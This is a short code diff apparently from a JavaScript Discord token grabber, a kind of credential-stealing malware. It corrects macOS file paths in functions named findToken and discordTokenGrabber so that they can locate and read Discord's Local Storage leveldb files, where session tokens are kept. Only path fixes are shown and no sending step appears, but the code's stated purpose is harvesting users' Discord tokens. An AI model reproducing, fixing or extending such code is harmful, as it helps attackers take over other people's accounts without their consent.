@@ -36,7 +36,7 @@ const findToken = (tokenPath) => {
       console.log(`=> No directory found for ${tokenPath}`)
     }
   } else if (computerPlatform == 'darwin') {
-    tokenPath += '/Local\\ Storage/leveldb/'
+    tokenPath += '/Local Storage/leveldb/'
 
     try {
       fs.readdirSync(path.normalize(tokenPath)).map((file) => {
@@ -98,7 +98,7 @@ function discordTokenGrabber() {
     }
   } else if (computerPlatform == 'darwin') {
     paths = {
-      Discord: path.join(process.env.HOME, 'Library', 'Application\\ Support', 'discord'),
+      Discord: path.join(process.env.HOME, 'Library', 'Application Support', 'discord'),
       'Discord Canary': path.join(
         process.env.HOME,
         'Library',
